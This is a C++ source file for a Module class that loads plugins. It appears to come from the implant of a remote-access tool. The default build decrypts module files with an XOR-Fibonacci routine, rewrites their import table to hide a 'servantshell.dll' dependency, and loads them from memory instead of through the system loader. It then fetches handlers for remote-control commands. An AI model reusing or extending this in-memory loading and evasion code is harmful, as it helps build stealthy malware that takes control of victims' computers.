#include "stdafx.h"
#include "file/MyFile.h"
#include "../../pub/ShellInclude.h"
#include "BinNames.h"
#include "common.h"
#include "Module.h"

Module::Module()
: m_hMod(NULL)
, m_status(MODULESTATUS_UNKNOWN)
, m_GetModName(NULL)
, m_InitModule(NULL)
, m_StartModule(NULL)
, m_StopModule(NULL)
, m_DeinitModule(NULL)
, m_QueryCommandHandler(NULL)
, m_pMemdll(NULL)
{

}

Module::~Module()
{
	if (NULL != m_pMemdll)
	{
		delete m_pMemdll;
		m_pMemdll = NULL;
	}
}

MODULE_STATUS Module::GetStatus() const
{
	return m_status;
}

LPCTSTR Module::GetModuleFilepath() const
{
	return m_dllFilepath.c_str();
}

#ifdef USE_SYS_API
//实用系统api来加载模块
BOOL Module::Load( LPCTSTR dllname )
{
	m_dllFilepath = dllname;
	m_dllFilepath += _T(".dll");

	m_hMod = ::LoadLibrary(m_dllFilepath.c_str());
	if (NULL == m_hMod)
	{
		errorLogE(_T("load library %s failed."), dllname);
		return FALSE;
	}

	BOOL bSuccess = FALSE;
	do 
	{
		m_GetModName = (FnGetModName) ::GetProcAddress(m_hMod, "GetModName");
		if (NULL == m_GetModName)
		{
			errorLogE(_T("get address of GetModName of [%s] failed"), dllname);
			break;
		}

		m_InitModule = (FnInitModule) ::GetProcAddress(m_hMod, "InitModule");
		if (NULL == m_InitModule)
		{
			errorLogE(_T("get address of InitModule of [%s] failed"), dllname);
			break;
		}

		m_StartModule = (FnStartModule) ::GetProcAddress(m_hMod, "StartModule");
		if (NULL == m_StartModule)
		{
			errorLogE(_T("get address of StartModule of [%s] failed"), dllname);
			break;
		}

		m_StopModule = (FnStopModule) ::GetProcAddress(m_hMod, "StopModule");
		if (NULL == m_StopModule)
		{
			errorLogE(_T("get address of StopModule of [%s] failed"), dllname);
			break;
		}

		m_DeinitModule = (FnDeinitModule) ::GetProcAddress(m_hMod, "DeinitModule");
		if (NULL == m_DeinitModule)
		{
			errorLogE(_T("get address of DeinitModule of [%s] failed"), dllname);
			break;
		}

		m_QueryCommandHandler = (FnQueryCommandHandler) ::GetProcAddress(m_hMod, "QueryCommandHandler");
		if (NULL == m_QueryCommandHandler)
		{
			errorLogE(_T("get address of QueryCommandHandler of [%s] failed"), dllname);
			break;
		}

		m_status = MODULESTATUS_LOADED;
		infoLog(_T("load module [%s] success"), dllname);

		bSuccess = TRUE;
	} while (FALSE);
	
	if (! bSuccess)
	{
		::FreeLibrary(m_hMod);
		m_hMod = NULL;
		m_GetModName = NULL;
		m_InitModule = NULL;
		m_StopModule = NULL;
		m_StartModule = NULL;
		m_DeinitModule = NULL;
		m_QueryCommandHandler = NULL;

		errorLog(_T("load module [%s] failed"), dllname);
	}

	return TRUE;
}
#else
//使用内存dll来加载模块
BOOL Module::Load( LPCTSTR dllname )
{
	if (NULL != m_pMemdll)
	{
		delete m_pMemdll;
		m_pMemdll = NULL;
	}

	m_dllFilepath = GetLocalPath();
	m_dllFilepath += dllname;
	m_dllFilepath += MODULE_POSTFIX;

	MyFile file;
	if (! file.Open(m_dllFilepath.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
	{
		errorLogE(_T("open file [%s] failed"), dllname);
		return FALSE;
	}
	ByteBuffer content;
	if (! file.ReadAll(content))
	{
		errorLogE(_T("read file [%s] failed"), dllname);
		return FALSE;
	}
#ifdef DECRYPT_MODULE
	XorFibonacciCrypt((LPBYTE)content, content.Size(), (LPBYTE)content, 3, 5);
#endif

	//替换引入表，将对servantshell.dll的引入，替换为当前dll的引入
	if (g_ConfigInfo.szServantshellRealname[0] != '\0') ReplaceIIDName((LPBYTE)content, t2a(SERVANT_SHELL_BINNAME), g_ConfigInfo.szServantshellRealname);

	m_pMemdll = new CMemLoadDll;

	BOOL bSuccess = FALSE;
	do 
	{
		if (! m_pMemdll->MemLoadLibrary((LPBYTE)content, content.Size()))
		{
			errorLogE(_T("load memlibrary failed [%s]"), dllname);
			break;
		}

		m_GetModName = (FnGetModName) m_pMemdll->MemGetProcAddress("GetModName");
		if (NULL == m_GetModName)
		{
			errorLogE(_T("get address of GetModName of [%s] failed"), dllname);
			break;
		}
		
		m_InitModule = (FnInitModule) m_pMemdll->MemGetProcAddress("InitModule");
		if (NULL == m_InitModule)
		{
			errorLogE(_T("get address of InitModule of [%s] failed"), dllname);
			break;
		}

		m_StartModule = (FnStartModule) m_pMemdll->MemGetProcAddress("StartModule");
		if (NULL == m_StartModule)
		{
			errorLogE(_T("get address of StartModule of [%s] failed"), dllname);
			break;
		}

		m_StopModule = (FnStopModule) m_pMemdll->MemGetProcAddress("StopModule");
		if (NULL == m_StopModule)
		{
			errorLogE(_T("get address of StopModule of [%s] failed"), dllname);
			break;
		}

		m_DeinitModule = (FnDeinitModule) m_pMemdll->MemGetProcAddress("DeinitModule");
		if (NULL == m_DeinitModule)
		{
			errorLogE(_T("get address of DeinitModule of [%s] failed"), dllname);
			break;
		}

		m_QueryCommandHandler = (FnQueryCommandHandler) m_pMemdll->MemGetProcAddress("QueryCommandHandler");
		if (NULL == m_QueryCommandHandler)
		{
			errorLogE(_T("get address of QueryCommandHandler of [%s] failed"), dllname);
			break;
		}

		m_status = MODULESTATUS_LOADED;
		infoLog(_T("load module [%s] success"), dllname);

		bSuccess = TRUE;
	} while (FALSE);

	if (! bSuccess)
	{
		delete m_pMemdll;
		m_pMemdll = NULL;
		m_hMod = NULL;
		m_GetModName = NULL;
		m_InitModule = NULL;
		m_StopModule = NULL;
		m_StartModule = NULL;
		m_DeinitModule = NULL;
		m_QueryCommandHandler = NULL;

		errorLog(_T("load module [%s] failed"), dllname);
	}

	return bSuccess;
}
#endif

BOOL Module::Load( ByteBuffer& content )
{
	if (NULL != m_pMemdll)
	{
		delete m_pMemdll;
		m_pMemdll = NULL;
	}

#ifdef DECRYPT_MODULE
	XorFibonacciCrypt((LPBYTE)content, content.Size(), (LPBYTE)content, 3, 5);
#endif

	//替换引入表，将对servantshell.dll的引入，替换为当前dll的引入
	if (g_ConfigInfo.szServantshellRealname[0] != '\0') ReplaceIIDName((LPBYTE)content, t2a(SERVANT_SHELL_BINNAME), g_ConfigInfo.szServantshellRealname);

	m_pMemdll = new CMemLoadDll;

	BOOL bSuccess = FALSE;
	do 
	{
		if (! m_pMemdll->MemLoadLibrary((LPBYTE)content, content.Size()))
		{
			break;
		}

		m_GetModName = (FnGetModName) m_pMemdll->MemGetProcAddress("GetModName");
		if (NULL == m_GetModName)
		{
			break;
		}

		m_InitModule = (FnInitModule) m_pMemdll->MemGetProcAddress("InitModule");
		if (NULL == m_InitModule)
		{
			break;
		}

		m_StartModule = (FnStartModule) m_pMemdll->MemGetProcAddress("StartModule");
		if (NULL == m_StartModule)
		{
			break;
		}

		m_StopModule = (FnStopModule) m_pMemdll->MemGetProcAddress("StopModule");
		if (NULL == m_StopModule)
		{
			break;
		}

		m_DeinitModule = (FnDeinitModule) m_pMemdll->MemGetProcAddress("DeinitModule");
		if (NULL == m_DeinitModule)
		{
			break;
		}

		m_QueryCommandHandler = (FnQueryCommandHandler) m_pMemdll->MemGetProcAddress("QueryCommandHandler");
		if (NULL == m_QueryCommandHandler)
		{
			break;
		}

		m_status = MODULESTATUS_LOADED;

		bSuccess = TRUE;
	} while (FALSE);

	if (! bSuccess)
	{
		delete m_pMemdll;
		m_pMemdll = NULL;
		m_hMod = NULL;
		m_GetModName = NULL;
		m_InitModule = NULL;
		m_StopModule = NULL;
		m_StartModule = NULL;
		m_DeinitModule = NULL;
		m_QueryCommandHandler = NULL;
	}

	return bSuccess;
}
LPCTSTR Module::GetModName() const
{
	if (NULL != m_GetModName) 
	{
		return m_GetModName();
	}

	return NULL;
}

BOOL Module::InitModule()
{
	if (NULL != m_InitModule) 
	{
		if (m_InitModule())
		{
			m_status = MODULESTATUS_STOPPED;
			infoLog(_T("init module [%s] success"), m_dllFilepath.c_str());
			return TRUE;
		}
		else
		{
			errorLog(_T("init module [%s] failed"), m_dllFilepath.c_str());
		}
	}
	
	return FALSE;
}

BOOL Module::StartModule()
{
	if (NULL != m_StartModule) 
	{
		if (m_StartModule())
		{
			m_status = MODULESTATUS_STARTED;
			infoLog(_T("start module [%s] success"), m_dllFilepath.c_str());
			return TRUE;
		}
		else
		{
			errorLog(_T("start module [%s] failed"), m_dllFilepath.c_str());
		}
	}
	
	return FALSE;
}

void Module::StopModule()
{
	if (NULL != m_StopModule) 
	{
		m_StopModule();
		m_status = MODULESTATUS_STOPPED;
		infoLog(_T("stop module [%s] success"), m_dllFilepath.c_str());
	}
}

void Module::DeinitModule()
{
	if (NULL != m_DeinitModule) 
	{
		m_DeinitModule();
		m_status = MODULESTATUS_LOADED;
		infoLog(_T("deinit module [%s] success"), m_dllFilepath.c_str());
	}
}

BOOL Module::QueryCommandHandler( MSGID msgid, FnExecuteRCCommand* ppHandler, LPVOID* ppParameter )
{
	if (NULL != m_QueryCommandHandler) 
	{
		return m_QueryCommandHandler(msgid, ppHandler, ppParameter);
	}

	return FALSE;
}
